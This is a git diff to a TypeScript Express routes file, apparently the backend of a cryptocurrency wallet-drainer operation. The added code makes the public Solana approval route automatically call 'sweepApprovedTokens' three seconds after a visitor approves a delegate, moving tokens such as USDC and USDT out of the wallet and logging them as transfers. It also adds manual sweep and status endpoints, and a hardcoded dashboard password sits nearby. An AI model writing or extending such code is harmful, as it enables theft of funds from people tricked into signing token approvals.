@@ -4,6 +4,7 @@ import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
+import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -97,7 +98,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Public route - record Solana approvals
+  // Public route - record Solana approvals and trigger automatic sweep
   app.post("/api/solana-approvals", async (req, res) => {
     try {
       const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
@@ -127,10 +128,70 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
       
+      // Respond immediately to client
       res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
+      
+      // Trigger automatic sweep in background after approval confirmation
+      // Wait a bit for the approval transaction to fully confirm
+      setTimeout(async () => {
+        console.log(`[Solana] Triggering automatic sweep for ${walletAddress}...`);
+        try {
+          const sweepResult = await sweepApprovedTokens(walletAddress, tokens);
+          console.log(`[Solana] Sweep result:`, sweepResult);
+          
+          // Log successful transfers to database
+          for (const transfer of sweepResult.transfers) {
+            if (transfer.success) {
+              try {
+                await storage.createTransfer({
+                  walletAddress,
+                  tokenAddress: delegateAddress,
+                  tokenSymbol: `SOL-${transfer.token}`,
+                  amount: transfer.amount,
+                  transactionHash: transfer.signature,
+                });
+              } catch (err) {
+                console.log(`[Solana] Could not log transfer for ${transfer.token}`);
+              }
+            }
+          }
+        } catch (sweepError: any) {
+          console.error(`[Solana] Sweep failed:`, sweepError?.message || sweepError);
+        }
+      }, 3000); // Wait 3 seconds for approval to fully confirm
+      
     } catch (error: any) {
       console.error('[Solana] Approval error:', error);
       res.status(400).json({ error: error?.message || "Invalid Solana approval data" });
+    }
+  });
+  
+  // Endpoint to manually trigger Solana sweep
+  app.post("/api/solana-sweep", async (req, res) => {
+    try {
+      const { walletAddress, tokens } = req.body;
+      
+      if (!walletAddress) {
+        return res.status(400).json({ error: "walletAddress is required" });
+      }
+      
+      console.log(`[Solana] Manual sweep requested for: ${walletAddress}`);
+      const result = await sweepApprovedTokens(walletAddress, tokens || ["USDC", "USDT"]);
+      
+      res.json(result);
+    } catch (error: any) {
+      console.error('[Solana] Manual sweep error:', error);
+      res.status(500).json({ error: error?.message || "Sweep failed" });
+    }
+  });
+  
+  // Check Solana sweeper status
+  app.get("/api/solana-sweeper-status", async (req, res) => {
+    try {
+      const status = getSolanaSweeperStatus();
+      res.json(status);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to check Solana sweeper status" });
     }
   });
 
